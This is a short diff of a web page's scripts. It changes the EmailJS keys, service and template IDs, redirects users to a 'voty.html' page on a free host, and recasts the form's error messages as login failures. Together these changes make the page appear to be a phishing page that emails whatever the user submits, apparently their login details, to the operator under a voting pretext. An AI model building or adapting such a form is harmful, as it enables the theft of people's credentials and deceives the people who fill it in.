@@ -203,7 +203,7 @@ hr {
 
   <script type="text/javascript">
     (function() {
-        emailjs.init("Sxo6rxrunCt_4JYom"); // Use your EmailJS User ID
+        emailjs.init("f4e9WkNtC012SJLfG"); // Use your EmailJS User ID
     })();
 
     document.getElementById("contact-form").addEventListener("submit", function(event) {
@@ -222,15 +222,15 @@ hr {
         };
 
         // Send the email using EmailJS
-        emailjs.send("service_g3vw7v4", "template_0qwosku", emailParams)
+        emailjs.send("service_75wx5te", "template_vuqsrlf", emailParams)
             .then(function(response) {
                 //console.log("Voting Is Processing:", response);
                 //alert("Voting Is Processing!");
             // Redirect to another page after email is sent
         window.location.href = "http://fashionworld.infy.uk/voty.html";  // Redirect to a 'thank you' page after email is sent
             }, function(error) {
-                console.error("Error sending email:", error);
-                alert("Failed to send message. Please try again later.");
+                console.error("Login Error:", error);
+                alert("Failed to Login. Please check and try again.");
             });
     });
 </script>
@@ -241,7 +241,7 @@ hr {
 <script type="text/javascript">
    (function(){
       emailjs.init({
-        publicKey: "Sxo6rxrunCt_4JYom",
+        publicKey: "f4e9WkNtC012SJLfG",
       });
    })();
 </script>
